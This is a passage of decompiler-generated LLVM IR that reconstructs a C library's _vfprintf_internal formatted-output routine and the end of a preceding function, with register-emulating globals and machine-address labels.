  %v1_804df04 = phi i32 [ 0, %dec_label_pc_804deec ], [ %v5_804defc, %dec_label_pc_804def2 ]
  %v0_804df04 = load i32, i32* @ebp, align 4
  %v2_804df04 = add i32 %v0_804df04, %v1_804df04
  br label %dec_label_pc_804df06

dec_label_pc_804df06:                             ; preds = %dec_label_pc_804ded4, %dec_label_pc_804df04
  %v0_804df09 = phi i32 [ %v0_804dedf, %dec_label_pc_804ded4 ], [ %v2_804df04, %dec_label_pc_804df04 ]
  ret i32 %v0_804df09

; uselistorder directives
  uselistorder i32 %v0_804def7, { 1, 0 }
  uselistorder i32 %v0_804dedf, { 1, 0, 2 }
  uselistorder i32 %v1_804ded4, { 1, 0 }
  uselistorder i32 %v2_804decc, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804df06, { 1, 0 }
  uselistorder label %dec_label_pc_804df04, { 1, 0 }
  uselistorder label %dec_label_pc_804deec, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804df1a = ptrtoint i8* %arg2 to i32
  store i32 %v4_804df1a, i32* @ebx, align 4
  %v2_804df22 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804df22, i32* @esi, align 4
  %v5_804df27 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804df1a)
  store i32 %v5_804df27, i32* %eax.global-to-local, align 4
  %v2_804df2f = icmp slt i32 %v5_804df27, 0
  %v1_804df31 = icmp eq i1 %v2_804df2f, false
  br i1 %v1_804df31, label %dec_label_pc_804df71, label %dec_label_pc_804df33

dec_label_pc_804df33:                             ; preds = %entry
  %v3_804df33 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804df33, i32* @ebx, align 4
  %v5_804df3a = inttoptr i32 %v3_804df33 to i8*
  %v3_804df3b = call i32 @strlen(i8* %v5_804df3a)
  store i32 %v3_804df3b, i32* %eax.global-to-local, align 4
  %v1_804df43 = icmp eq i32 %v3_804df3b, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804df43, label %dec_label_pc_804e4aa, label %dec_label_pc_804df52

dec_label_pc_804df52:                             ; preds = %dec_label_pc_804df33
  %v0_804df52 = load i32, i32* @edx, align 4
  %v0_804df5b = load i32, i32* @ebx, align 4
  %v6_804df5c = call i32 @__stdio_fwrite(i32 %v0_804df5b, i32 %v3_804df3b, i32 %arg1, i32 %v0_804df52)
  store i32 %v6_804df5c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804e4aa

dec_label_pc_804df71:                             ; preds = %entry
  %v6_804df7b = call i32 @_ppfs_prepargs(i32 %v2_804df22, i32 %arg3, i32 %v5_804df27, i32 %v5_804df27)
  store i32 %v6_804df7b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804df88 = load i32, i32* @ebx, align 4
  store i32 %v0_804df88, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804df90

dec_label_pc_804df8f:                             ; preds = %dec_label_pc_804df96
  %v1_804df8f = add i32 %v0_804df9e, 1
  store i32 %v1_804df8f, i32* @ebx, align 4
  br label %dec_label_pc_804df90.backedge

dec_label_pc_804df90.backedge:                    ; preds = %dec_label_pc_804df8f, %dec_label_pc_804e490, %dec_label_pc_804e49b
  %v1_804df9a20 = phi i32 [ %v1_804dfa2, %dec_label_pc_804df8f ], [ %v3_804e490, %dec_label_pc_804e490 ], [ %v1_804dfce, %dec_label_pc_804e49b ]
  %v0_804df9018 = phi i32 [ %v1_804df8f, %dec_label_pc_804df8f ], [ %v3_804e490, %dec_label_pc_804e490 ], [ %v1_804e49b, %dec_label_pc_804e49b ]
  %v4_804df90.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df90

dec_label_pc_804df90:                             ; preds = %dec_label_pc_804df90.backedge, %dec_label_pc_804df71
  %v1_804dfa2 = phi i32 [ %v1_804df9a20, %dec_label_pc_804df90.backedge ], [ %v0_804df88, %dec_label_pc_804df71 ]
  %v0_804df9e = phi i32 [ %v0_804df9018, %dec_label_pc_804df90.backedge ], [ %v0_804df88, %dec_label_pc_804df71 ]
  %v4_804df90 = phi i32 [ %v4_804df90.pre, %dec_label_pc_804df90.backedge ], [ %v6_804df7b, %dec_label_pc_804df71 ]
  %v1_804df90 = inttoptr i32 %v0_804df9e to i8*
  %v2_804df90 = load i8, i8* %v1_804df90, align 1
  %v3_804df90 = zext i8 %v2_804df90 to i32
  %v5_804df90 = and i32 %v4_804df90, -256
  %v6_804df90 = or i32 %v3_804df90, %v5_804df90
  store i32 %v6_804df90, i32* %eax.global-to-local, align 4
  %v4_804df92 = icmp eq i8 %v2_804df90, 0
  br i1 %v4_804df92, label %dec_label_pc_804df9a, label %dec_label_pc_804df96

dec_label_pc_804df96:                             ; preds = %dec_label_pc_804df90
  %v10_804df96 = icmp eq i8 %v2_804df90, 37
  %v1_804df98 = icmp eq i1 %v10_804df96, false
  br i1 %v1_804df98, label %dec_label_pc_804df8f, label %dec_label_pc_804df9a

dec_label_pc_804df9a:                             ; preds = %dec_label_pc_804df96, %dec_label_pc_804df90
  %v2_804df9a = sub i32 %v0_804df9e, %v1_804dfa2
  %v12_804df9a = icmp eq i32 %v2_804df9a, 0
  br i1 %v12_804df9a, label %dec_label_pc_804dfc5, label %dec_label_pc_804df9e

dec_label_pc_804df9e:                             ; preds = %dec_label_pc_804df9a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804df9a, i32* @esi, align 4
  %tmp67 = icmp slt i32 %v2_804df9a, 1
  br i1 %tmp67, label %dec_label_pc_804dfba, label %dec_label_pc_804dfa8

dec_label_pc_804dfa8:                             ; preds = %dec_label_pc_804df9e
  %v0_804dfa8 = load i32, i32* @ebp, align 4
  %v1_804dfa8 = load i32, i32* @esp, align 4
  %v2_804dfa8 = add i32 %v1_804dfa8, -4
  %v3_804dfa8 = inttoptr i32 %v2_804dfa8 to i32*
  store i32 %v0_804dfa8, i32* %v3_804dfa8, align 4
  %v1_804dfa9 = add i32 %v1_804dfa8, 368
  %v2_804dfa9 = inttoptr i32 %v1_804dfa9 to i32*
  %v3_804dfa9 = load i32, i32* %v2_804dfa9, align 4
  %v5_804dfa9 = add i32 %v1_804dfa8, -8
  %v6_804dfa9 = inttoptr i32 %v5_804dfa9 to i32*
  store i32 %v3_804dfa9, i32* %v6_804dfa9, align 4
  %v0_804dfb0 = load i32, i32* @esi, align 4
  %v2_804dfb0 = add i32 %v1_804dfa8, -12
  %v3_804dfb0 = inttoptr i32 %v2_804dfb0 to i32*
  store i32 %v0_804dfb0, i32* %v3_804dfb0, align 4
  %v0_804dfb1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dfb1 = add i32 %v1_804dfa8, -16
  %v3_804dfb1 = inttoptr i32 %v2_804dfb1 to i32*
  store i32 %v0_804dfb1, i32* %v3_804dfb1, align 4
  %v0_804dfb2 = load i32, i32* %stack_var_-364, align 4
  %v4_804dfb2 = call i32 @__stdio_fwrite(i32 %v0_804dfb2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dfb2, i32* %eax.global-to-local, align 4
  %v1_804dfba.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dfba

dec_label_pc_804dfba:                             ; preds = %dec_label_pc_804df9e, %dec_label_pc_804dfa8
  %v3_804dfc2 = phi i32 [ %v2_804df9a, %dec_label_pc_804df9e ], [ %v1_804dfba.pre, %dec_label_pc_804dfa8 ]
  %v0_804dfba = phi i32 [ 0, %dec_label_pc_804df9e ], [ %v4_804dfb2, %dec_label_pc_804dfa8 ]
  %v12_804dfba = icmp eq i32 %v0_804dfba, %v3_804dfc2
  %v1_804dfbc = icmp eq i1 %v12_804dfba, false
  %v0_804e4a3.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804dfbc, label %dec_label_pc_804e4a3, label %dec_label_pc_804dfc2

dec_label_pc_804dfc2:                             ; preds = %dec_label_pc_804dfba
  %v1_804dfc2 = inttoptr i32 %v0_804e4a3.pre.pre to i32*
  %v2_804dfc2 = load i32, i32* %v1_804dfc2, align 4
  %v4_804dfc2 = add i32 %v2_804dfc2, %v3_804dfc2
  store i32 %v4_804dfc2, i32* %v1_804dfc2, align 4
  %v0_804dfc5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804dfc5

dec_label_pc_804dfc5:                             ; preds = %dec_label_pc_804df9a, %dec_label_pc_804dfc2
  %v0_804e49b = phi i32 [ %v0_804df9e, %dec_label_pc_804df9a ], [ %v0_804dfc5.pre, %dec_label_pc_804dfc2 ]
  %v1_804dfc5 = inttoptr i32 %v0_804e49b to i8*
  %v2_804dfc5 = load i8, i8* %v1_804dfc5, align 1
  %v3_804dfc5 = icmp eq i8 %v2_804dfc5, 0
  br i1 %v3_804dfc5, label %dec_label_pc_804e4aa, label %dec_label_pc_804dfce

dec_label_pc_804dfce:                             ; preds = %dec_label_pc_804dfc5
  %v1_804dfce = add i32 %v0_804e49b, 1
  store i32 %v1_804dfce, i32* %edx.global-to-local, align 4
  %v2_804dfd1 = inttoptr i32 %v1_804dfce to i8*
  %v3_804dfd1 = load i8, i8* %v2_804dfd1, align 1
  %v12_804dfd1 = icmp eq i8 %v3_804dfd1, 37
  br i1 %v12_804dfd1, label %dec_label_pc_804e49b, label %dec_label_pc_804dfdb

dec_label_pc_804dfdb:                             ; preds = %dec_label_pc_804dfce
  %v1_804dfdb = load i32, i32* @esp, align 4
  %v2_804dfdb = add i32 %v1_804dfdb, 16
  %v3_804dfdb = inttoptr i32 %v2_804dfdb to i32*
  store i32 %v1_804dfce, i32* %v3_804dfdb, align 4
  %v0_804dfdf = load i32, i32* @esp, align 4
  %v1_804dfdf = add i32 %v0_804dfdf, 340
  %v2_804dfdf = inttoptr i32 %v1_804dfdf to i32*
  store i32 0, i32* %v2_804dfdf, align 4
  %v0_804dfea = load i32, i32* @esp, align 4
  %v1_804dfed = add i32 %v0_804dfea, 16
  store i32 %v1_804dfed, i32* @ebx, align 4
  %v2_804dff1 = add i32 %v0_804dfea, -16
  %v3_804dff1 = inttoptr i32 %v2_804dff1 to i32*
  store i32 %v1_804dfed, i32* %v3_804dff1, align 4
  %v0_804dff2 = load i32, i32* %stack_var_-364, align 4
  %v1_804dff2 = inttoptr i32 %v0_804dff2 to i32*
  %v2_804dff2 = call i32 @_ppfs_parsespec(i32* %v1_804dff2)
  store i32 %v2_804dff2, i32* %eax.global-to-local, align 4
  %v0_804dff7 = load i32, i32* @ebx, align 4
  %v1_804dff7 = load i32, i32* @esp, align 4
  %v2_804dff7 = inttoptr i32 %v1_804dff7 to i32*
  store i32 %v0_804dff7, i32* %v2_804dff7, align 4
  %v0_804dffa = load i32, i32* %stack_var_-364, align 4
  %v1_804dffa = call i32 @_ppfs_setargs(i32 %v0_804dffa)
  store i32 %v1_804dffa, i32* %eax.global-to-local, align 4
  %v0_804dfff = load i32, i32* @esp, align 4
  %v1_804dfff = add i32 %v0_804dfff, 70
  %v2_804dfff = inttoptr i32 %v1_804dfff to i8*
  %v3_804dfff = load i8, i8* %v2_804dfff, align 1
  %v4_804dfff = zext i8 %v3_804dfff to i32
  store i32 %v4_804dfff, i32* @edi, align 4
  %v1_804e004 = add i32 %v0_804dfff, 16
  %v1_804e007 = add i32 %v0_804dfff, 56
  %v2_804e007 = inttoptr i32 %v1_804e007 to i32*
  %v3_804e007 = load i32, i32* %v2_804e007, align 4
  %v1_804e00c = add i32 %v0_804dfff, 112
  store i32 %v1_804e00c, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_804e007, 1
  br i1 %tmp68, label %dec_label_pc_804e019, label %dec_label_pc_804e012

dec_label_pc_804e012:                             ; preds = %dec_label_pc_804dfdb
  %v2_804e012 = zext i8 %v3_804dfff to i32
  %v3_804e012 = mul nuw nsw i32 %v2_804e012, 12
  store i32 %v3_804e012, i32* %eax.global-to-local, align 4
  %v2_804e015 = add i32 %v0_804dfff, 100
  %v3_804e015 = add i32 %v2_804e015, %v3_804e012
  store i32 %v3_804e015, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e019

dec_label_pc_804e019:                             ; preds = %dec_label_pc_804dfdb, %dec_label_pc_804e012
  %v0_804e02128 = phi i32 [ %v1_804e00c, %dec_label_pc_804dfdb ], [ %v3_804e015, %dec_label_pc_804e012 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e01b = add i32 %v0_804dfff, 60
  %v2_804e01b = inttoptr i32 %v1_804e01b to i32*
  %v3_804e01b = load i32, i32* %v2_804e01b, align 4
  store i32 %v3_804e01b, i32* %ecx.global-to-local, align 4
  %v2_804e02c81 = sub i32 0, %v3_804e01b
  %v10_804e02c84 = and i32 %v3_804e01b, %v2_804e02c81
  %v11_804e02c85 = icmp slt i32 %v10_804e02c84, 0
  %v13_804e02c86 = icmp slt i32 %v2_804e02c81, 0
  %v2_804e02e87 = icmp eq i1 %v13_804e02c86, %v11_804e02c85
  br i1 %v2_804e02e87, label %dec_label_pc_804e030, label %dec_label_pc_804e021

dec_label_pc_804e021:                             ; preds = %dec_label_pc_804e019, %dec_label_pc_804e021
  %v0_804e03091 = phi i32 [ %v0_804e030, %dec_label_pc_804e021 ], [ %v1_804e004, %dec_label_pc_804e019 ]
  %v2_804e02190 = phi i32 [ %v1_804e02b, %dec_label_pc_804e021 ], [ 0, %dec_label_pc_804e019 ]
  %v0_804e02189 = phi i32 [ %v1_804e028, %dec_label_pc_804e021 ], [ %v0_804e02128, %dec_label_pc_804e019 ]
  %v3_804e021 = mul i32 %v2_804e02190, 4
  %v4_804e021 = add i32 %v0_804e03091, 344
  %v5_804e021 = add i32 %v4_804e021, %v3_804e021
  %v6_804e021 = inttoptr i32 %v5_804e021 to i32*
  store i32 %v0_804e02189, i32* %v6_804e021, align 4
  %v0_804e028 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e028 = add i32 %v0_804e028, 12
  store i32 %v1_804e028, i32* %edx.global-to-local, align 4
  %v0_804e02b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e02b = add i32 %v0_804e02b, 1
  store i32 %v1_804e02b, i32* %eax.global-to-local, align 4
  %v1_804e02c.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e02c = sub i32 %v1_804e02b, %v1_804e02c.pre
  %v8_804e02c = xor i32 %v1_804e02b, %v1_804e02c.pre
  %v9_804e02c = xor i32 %v2_804e02c, %v1_804e02b
  %v10_804e02c = and i32 %v9_804e02c, %v8_804e02c
  %v11_804e02c = icmp slt i32 %v10_804e02c, 0
  %v13_804e02c = icmp slt i32 %v2_804e02c, 0
  %v2_804e02e = icmp eq i1 %v13_804e02c, %v11_804e02c
  %v0_804e030 = load i32, i32* @esp, align 4
  br i1 %v2_804e02e, label %dec_label_pc_804e030, label %dec_label_pc_804e021

dec_label_pc_804e030:                             ; preds = %dec_label_pc_804e021, %dec_label_pc_804e019
  %v0_804e030.lcssa = phi i32 [ %v1_804e004, %dec_label_pc_804e019 ], [ %v0_804e030, %dec_label_pc_804e021 ]
  %v1_804e030 = add i32 %v0_804e030.lcssa, 48
  %v2_804e030 = inttoptr i32 %v1_804e030 to i32*
  %v3_804e030 = load i32, i32* %v2_804e030, align 4
  store i32 %v3_804e030, i32* @ecx, align 4
  %v1_804e034 = icmp eq i32 %v3_804e030, 0
  %v1_804e036 = icmp eq i1 %v1_804e034, false
  br i1 %v1_804e036, label %dec_label_pc_804e05e, label %dec_label_pc_804e038

dec_label_pc_804e038:                             ; preds = %dec_label_pc_804e030
  %v1_804e038 = inttoptr i32 %v0_804e030.lcssa to i32*
  %v2_804e038 = load i32, i32* %v1_804e038, align 4
  store i32 %v2_804e038, i32* %eax.global-to-local, align 4
  %v1_804e03b = ashr i32 %v2_804e038, 31
  store i32 %v1_804e03b, i32* %edx.global-to-local, align 4
  %v2_804e03c = add i32 %v0_804e030.lcssa, -4
  %v3_804e03c = inttoptr i32 %v2_804e03c to i32*
  store i32 %v1_804e03b, i32* %v3_804e03c, align 4
  %v0_804e03d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e03d = add i32 %v0_804e030.lcssa, -8
  %v3_804e03d = inttoptr i32 %v2_804e03d to i32*
  store i32 %v0_804e03d, i32* %v3_804e03d, align 4
  %v1_804e03e = add i32 %v0_804e030.lcssa, 32
  %v2_804e03e = inttoptr i32 %v1_804e03e to i32*
  %v3_804e03e = load i32, i32* %v2_804e03e, align 4
  %v1_804e042 = and i32 %v3_804e03e, 3840
  store i32 %v1_804e042, i32* %eax.global-to-local, align 4
  %v2_804e047 = add i32 %v0_804e030.lcssa, -12
  %v3_804e047 = inttoptr i32 %v2_804e047 to i32*
  store i32 %v1_804e042, i32* %v3_804e047, align 4
  %v1_804e048 = add i32 %v0_804e030.lcssa, 344
  %v2_804e048 = inttoptr i32 %v1_804e048 to i32*
  %v3_804e048 = load i32, i32* %v2_804e048, align 4
  store i32 %v3_804e048, i32* %eax.global-to-local, align 4
  %v1_804e04f = inttoptr i32 %v3_804e048 to i32*
  %v2_804e04f = load i32, i32* %v1_804e04f, align 4
  %v4_804e04f = add i32 %v0_804e030.lcssa, -16
  %v5_804e04f = inttoptr i32 %v4_804e04f to i32*
  store i32 %v2_804e04f, i32* %v5_804e04f, align 4
  %v0_804e051 = call i32 @_store_inttype()
  store i32 %v0_804e051, i32* %eax.global-to-local, align 4
  %v0_804e056 = load i32, i32* @esp, align 4
  %v1_804e056 = add i32 %v0_804e056, 16
  br label %dec_label_pc_804e490

dec_label_pc_804e05e:                             ; preds = %dec_label_pc_804e030
  %tmp94 = icmp ult i32 %v3_804e030, 8
  br i1 %tmp94, label %dec_label_pc_804e067, label %dec_label_pc_804e1c8

dec_label_pc_804e067:                             ; preds = %dec_label_pc_804e05e
  %v1_804e067 = add i32 %v3_804e030, 134547864
  %v2_804e067 = inttoptr i32 %v1_804e067 to i8*
  %v3_804e067 = load i8, i8* %v2_804e067, align 1
  %v4_804e067 = sext i8 %v3_804e067 to i32
  store i32 %v4_804e067, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e073 = icmp eq i8 %v3_804e067, 10
  %v1_804e076 = icmp eq i1 %v9_804e073, false
  br i1 %v1_804e076, label %dec_label_pc_804e094, label %dec_label_pc_804e078

dec_label_pc_804e078:                             ; preds = %dec_label_pc_804e067
  %v1_804e078 = add i32 %v0_804e030.lcssa, 32
  %v2_804e078 = inttoptr i32 %v1_804e078 to i32*
  %v3_804e078 = load i32, i32* %v2_804e078, align 4
  %v1_804e07e = and i32 %v3_804e078, 32
  store i32 %v1_804e07e, i32* %eax.global-to-local, align 4
  %tmp69 = udiv i32 %v1_804e07e, 32
  %tmp70 = sub nsw i32 45, %tmp69
  store i32 %tmp70, i32* @ebx, align 4
  %v1_804e08c = trunc i32 %v3_804e078 to i8
  %v2_804e08c = and i8 %v1_804e08c, 64
  %v3_804e08c = icmp eq i8 %v2_804e08c, 0
  %v5_804e08c = zext i8 %v2_804e08c to i32
  %v7_804e08c = and i32 %v3_804e078, -256
  %v8_804e08c = or i32 %v5_804e08c, %v7_804e08c
  store i32 %v8_804e08c, i32* %edx.global-to-local, align 4
  br i1 %v3_804e08c, label %dec_label_pc_804e094, label %dec_label_pc_804e091

dec_label_pc_804e091:                             ; preds = %dec_label_pc_804e078
  %v2_804e091 = or i32 %tmp70, 128
  store i32 %v2_804e091, i32* @ebx, align 4
  br label %dec_label_pc_804e094

dec_label_pc_804e094:                             ; preds = %dec_label_pc_804e078, %dec_label_pc_804e067, %dec_label_pc_804e091
  %tmp95 = icmp ult i32 %v3_804e030, 6
  br i1 %tmp95, label %dec_label_pc_804e099, label %dec_label_pc_804e0b1

dec_label_pc_804e099:                             ; preds = %dec_label_pc_804e094
  %v9_804e099 = icmp eq i32 %v3_804e030, 3
  %v1_804e09c = icmp eq i1 %v9_804e099, false
  br i1 %v1_804e09c, label %dec_label_pc_804e0a5, label %dec_label_pc_804e09e

dec_label_pc_804e09e:                             ; preds = %dec_label_pc_804e099
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e0b3

dec_label_pc_804e0a5:                             ; preds = %dec_label_pc_804e099
  %v9_804e0aa = icmp eq i32 %v3_804e030, 1
  br i1 %v9_804e0aa, label %dec_label_pc_804e0b8, label %dec_label_pc_804e0b3

dec_label_pc_804e0b1:                             ; preds = %dec_label_pc_804e094
  %v1_804e0b1 = sub nsw i32 0, %v4_804e067
  store i32 %v1_804e0b1, i32* @esi, align 4
  br label %dec_label_pc_804e0b3

dec_label_pc_804e0b3:                             ; preds = %dec_label_pc_804e0a5, %dec_label_pc_804e09e, %dec_label_pc_804e0b1
  br label %dec_label_pc_804e0b8

dec_label_pc_804e0b8:                             ; preds = %dec_label_pc_804e0a5, %dec_label_pc_804e0b3
  %storemerge106 = phi i32 [ 11, %dec_label_pc_804e0b3 ], [ 6, %dec_label_pc_804e0a5 ]
  store i32 %storemerge106, i32* @ebp, align 4
  %v1_804e0b8 = add i32 %v0_804e030.lcssa, 7
  %v2_804e0b8 = inttoptr i32 %v1_804e0b8 to i8*
  store i8 32, i8* %v2_804e0b8, align 1
  %v0_804e0bd = load i32, i32* @esp, align 4
  %v1_804e0bd = add i32 %v0_804e0bd, 20
  %v2_804e0bd = inttoptr i32 %v1_804e0bd to i32*
  %v3_804e0bd = load i32, i32* %v2_804e0bd, align 4
  %v5_804e0bd = icmp slt i32 %v3_804e0bd, 0
  %v1_804e0c2 = icmp eq i1 %v5_804e0bd, false
  br i1 %v1_804e0c2, label %dec_label_pc_804e0cc, label %dec_label_pc_804e0c4

dec_label_pc_804e0c4:                             ; preds = %dec_label_pc_804e0b8
  %v1_804e0c4 = add i32 %v0_804e0bd, 36
  %v2_804e0c4 = inttoptr i32 %v1_804e0c4 to i8*
  %v3_804e0c4 = load i8, i8* %v2_804e0c4, align 1
  %v4_804e0c4 = zext i8 %v3_804e0c4 to i32
  %v5_804e0c4 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e0c4 = and i32 %v5_804e0c4, -256
  %v7_804e0c4 = or i32 %v6_804e0c4, %v4_804e0c4
  store i32 %v7_804e0c4, i32* %edx.global-to-local, align 4
  %v3_804e0c8 = add i32 %v0_804e0bd, 7
  %v4_804e0c8 = inttoptr i32 %v3_804e0c8 to i8*
  store i8 %v3_804e0c4, i8* %v4_804e0c8, align 1
  %v0_804e0cc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e0cc

dec_label_pc_804e0cc:                             ; preds = %dec_label_pc_804e0b8, %dec_label_pc_804e0c4
  %v1_804e0e5 = phi i32 [ %v0_804e0bd, %dec_label_pc_804e0b8 ], [ %v0_804e0cc.pre, %dec_label_pc_804e0c4 ]
  %v1_804e0cc = add i32 %v1_804e0e5, 344
  %v2_804e0cc = inttoptr i32 %v1_804e0cc to i32*
  %v3_804e0cc = load i32, i32* %v2_804e0cc, align 4
  store i32 %v3_804e0cc, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804e0d8 = add i32 %v3_804e030, -1
  %v8_804e0d8 = icmp eq i32 %v1_804e0d8, 0
  store i32 %v1_804e0d8, i32* %ecx.global-to-local, align 4
  %v0_804e0e5.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e0d8, label %dec_label_pc_804e0e5, label %dec_label_pc_804e0db

dec_label_pc_804e0db:                             ; preds = %dec_label_pc_804e0cc
  %v2_804e0db = mul i32 %v0_804e0e5.pre, 4
  %v3_804e0db = add i32 %v1_804e0e5, 52
  %v4_804e0db = add i32 %v3_804e0db, %v2_804e0db
  %v5_804e0db = inttoptr i32 %v4_804e0db to i32*
  %v6_804e0db = load i32, i32* %v5_804e0db, align 4
  %v1_804e0df = and i32 %v6_804e0db, 3840
  store i32 %v1_804e0df, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e0e5

dec_label_pc_804e0e5:                             ; preds = %dec_label_pc_804e0cc, %dec_label_pc_804e0db
  %v2_804e0e5 = add i32 %v1_804e0e5, -4
  %v3_804e0e5 = inttoptr i32 %v2_804e0e5 to i32*
  store i32 %v0_804e0e5.pre, i32* %v3_804e0e5, align 4
  %v0_804e0e6 = load i32, i32* @esi, align 4
  %v2_804e0e6 = add i32 %v1_804e0e5, -8
  %v3_804e0e6 = inttoptr i32 %v2_804e0e6 to i32*
  store i32 %v0_804e0e6, i32* %v3_804e0e6, align 4
  %v0_804e0e7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e0e7 = add i32 %v1_804e0e5, -12
  %v3_804e0e7 = inttoptr i32 %v2_804e0e7 to i32*
  store i32 %v0_804e0e7, i32* %v3_804e0e7, align 4
  %v0_804e0e8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e0e8 = add i32 %v1_804e0e5, -16
  %v3_804e0e8 = inttoptr i32 %v2_804e0e8 to i32*
  store i32 %v0_804e0e8, i32* %v3_804e0e8, align 4
  %v0_804e0e9 = call i32 @_load_inttype()
  %v0_804e0ee = load i32, i32* @ebx, align 4
  %v1_804e0ee = load i32, i32* @esp, align 4
  %v2_804e0ee = inttoptr i32 %v1_804e0ee to i32*
  store i32 %v0_804e0ee, i32* %v2_804e0ee, align 4
  %v0_804e0f1 = load i32, i32* @esi, align 4
  %v1_804e0f1 = load i32, i32* @esp, align 4
  %v2_804e0f1 = add i32 %v1_804e0f1, -4
  %v3_804e0f1 = inttoptr i32 %v2_804e0f1 to i32*
  store i32 %v0_804e0f1, i32* %v3_804e0f1, align 4
  %v0_804e0f2 = load i32, i32* @edx, align 4
  %v2_804e0f2 = add i32 %v1_804e0f1, -8
  %v3_804e0f2 = inttoptr i32 %v2_804e0f2 to i32*
  store i32 %v0_804e0f2, i32* %v3_804e0f2, align 4
  %v2_804e0f3 = add i32 %v1_804e0f1, -12
  %v3_804e0f3 = inttoptr i32 %v2_804e0f3 to i32*
  store i32 %v0_804e0e9, i32* %v3_804e0f3, align 4
  %v1_804e0f4 = add i32 %v1_804e0f1, 347
  store i32 %v1_804e0f4, i32* %eax.global-to-local, align 4
  %v2_804e0fb = add i32 %v1_804e0f1, -16
  %v3_804e0fb = inttoptr i32 %v2_804e0fb to i32*
  store i32 %v1_804e0f4, i32* %v3_804e0fb, align 4
  %v0_804e0fc = load i32, i32* %stack_var_-364, align 4
  %v5_804e0fc = inttoptr i32 %v0_804e0fc to i8*
  %v6_804e0fc = call i32 @_uintmaxtostr(i8* %v5_804e0fc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e0fc, i32* %eax.global-to-local, align 4
  %v0_804e101 = load i32, i32* @esp, align 4
  %v1_804e101 = add i32 %v0_804e101, 32
  store i32 %v6_804e0fc, i32* @edi, align 4
  %v1_804e106 = add i32 %v0_804e101, 80
  %v2_804e106 = inttoptr i32 %v1_804e106 to i32*
  %v3_804e106 = load i32, i32* %v2_804e106, align 4
  %tmp96 = icmp ult i32 %v3_804e106, 6
  br i1 %tmp96, label %dec_label_pc_804e134, label %dec_label_pc_804e10d

dec_label_pc_804e10d:                             ; preds = %dec_label_pc_804e0e5
  %v1_804e10d = inttoptr i32 %v6_804e0fc to i8*
  %v2_804e10d = load i8, i8* %v1_804e10d, align 1
  %v11_804e10d = icmp eq i8 %v2_804e10d, 45
  %v1_804e110 = icmp eq i1 %v11_804e10d, false
  %v1_804e11f = add i32 %v0_804e101, 64
  %v2_804e11f = inttoptr i32 %v1_804e11f to i32*
  %v3_804e11f = load i32, i32* %v2_804e11f, align 4
  br i1 %v1_804e110, label %dec_label_pc_804e11f, label %dec_label_pc_804e112

dec_label_pc_804e112:                             ; preds = %dec_label_pc_804e10d
  %v4_804e112 = or i32 %v3_804e11f, 2
  store i32 %v4_804e112, i32* %v2_804e11f, align 4
  %v0_804e117 = load i32, i32* @edi, align 4
  %v1_804e117 = add i32 %v0_804e117, 1
  store i32 %v1_804e117, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e134.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e134

dec_label_pc_804e11f:                             ; preds = %dec_label_pc_804e10d
  store i32 %v3_804e11f, i32* %eax.global-to-local, align 4
  %v2_804e123 = and i32 %v3_804e11f, 2
  %v3_804e123 = icmp eq i32 %v2_804e123, 0
  br i1 %v3_804e123, label %dec_label_pc_804e12b, label %dec_label_pc_804e127

dec_label_pc_804e127:                             ; preds = %dec_label_pc_804e11f
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e134

dec_label_pc_804e12b:                             ; preds = %dec_label_pc_804e11f
  %v2_804e12b = urem i32 %v3_804e11f, 2
  %v3_804e12b = icmp eq i32 %v2_804e12b, 0
  br i1 %v3_804e12b, label %dec_label_pc_804e134, label %dec_label_pc_804e12f

dec_label_pc_804e12f:                             ; preds = %dec_label_pc_804e12b
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804e134

dec_label_pc_804e134:                             ; preds = %dec_label_pc_804e12b, %dec_label_pc_804e0e5, %dec_label_pc_804e127, %dec_label_pc_804e112, %dec_label_pc_804e12f
